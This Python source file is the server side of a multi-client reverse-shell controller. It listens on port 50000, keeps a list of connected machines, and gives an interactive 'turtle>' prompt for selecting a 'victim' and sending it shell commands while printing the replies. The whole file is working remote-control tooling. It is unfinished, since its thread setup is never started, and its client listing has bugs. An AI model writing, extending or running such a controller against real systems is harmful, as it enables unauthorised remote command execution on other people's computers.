import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = [] #SAVES THE CONNECTIONS TO A LIST
all_addresses = [] #SAVES THE ADDRESS OF THE CLIENT


#create an INET, STREAMing socket
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 50000 # Port to listen on (non-privileged ports are > 1023)
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg)) # Print error message

# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port)) # Print port number

        s.bind((host, port)) # Bind to the port
        s.listen(5) # Listen up to 5 connections

    except socket.error as msg:
        print("Socket Binding error: " + str(msg) + "\n" + "Retrying...") # Print error message
        bind_socket() # Recursion

# Handling connection from multiple clients and saving to a list
# Closing previous connections when server.py file is restarted

def accepting_connections():
    for c in all_connections:
        c.close()

    del all_connections[:] # Delete all the connections
    del all_addresses[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1) # Prevents timeout

            all_connections.append(conn)
            all_addresses.append(address)

            print("Connection has been established: " + address[0])

        except:
            print("Error accepting connections")

# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client
# Interactive prompt for sending commands remotely
# Display all current active connections with client

def start_turtle():
    while True:
        cmd = input('turtle> ') #name of the prompt name shell
        if cmd == 'list':
            list_connections()

        elif 'select' in cmd:
            conn = get_target(cmd) #get the target
            if conn is not None:
                send_target_commands(conn) #check if connection is not none

        else:
            print("Command not recognized")

# Display all current active connections with client

def list_connections():
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' ')) #send a blank space to check if the connection is still active
            conn.recv(201480) #receive data
        except:
            del all_connections[i] #if the connection is not active delete it
            del all_addresses[i] #delete the address
            continue

        results = str(i) + "   " + str(all_addresses[i][0]) + "   " + str(all_addresses[i][1]) + "\n"

    print("-----Clients-----" + " " + results)


# Selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ', '') # target = id
        target = int(target)
        conn = all_connections[target] #gets the connection
        print("You are now connected to: " + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + ">", end="") #prevents from going to the next line
        return conn
    except:
        print("Selection not valid")
        return None

# Send commands to client/victim or a friend
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("Error sending commands")
            break